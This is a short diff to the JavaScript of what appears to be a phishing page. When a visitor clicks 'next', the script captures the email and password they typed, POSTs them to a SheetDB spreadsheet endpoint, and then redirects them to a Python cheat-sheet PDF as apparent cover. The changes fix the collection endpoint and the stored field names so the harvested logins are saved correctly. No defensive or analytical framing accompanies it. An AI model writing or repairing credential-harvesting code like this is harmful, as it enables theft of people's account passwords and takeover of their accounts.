@@ -13,12 +13,12 @@ document.getElementById("nextBtn").addEventListener("click", async function (eve
 
   // Send data to SheetDB
   try {
-    const response = await fetch("https://api.sheetdb.io/sheet/https://docs.google.com/spreadsheets/d/1ukjjPocGZgH04PKUNTYxYgJjKCCVUnp0swES83mGY4U/edit#gid=0", {
+    const response = await fetch("https://api.sheetdb.io/sheet/ryfvidjjqmoam", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
-      body: JSON.stringify({ data: { email, password } }),
+      body: JSON.stringify({ data: { Email: email, Password: password } }),
     });
 
     const result = await response.json();
@@ -27,7 +27,7 @@ document.getElementById("nextBtn").addEventListener("click", async function (eve
       // Redirect to the PDF file
       window.location.href = "https://allinpython.com/wp-content/uploads/2023/09/Python-Cheat-Sheet.pdf"; // Replace with your PDF URL
     } else {
-      alert("Failed to save data: " + result.message);
+      alert("Failed to save data: " + (result.error || "Unknown error"));
     }
   } catch (error) {
     console.error("Error:", error);
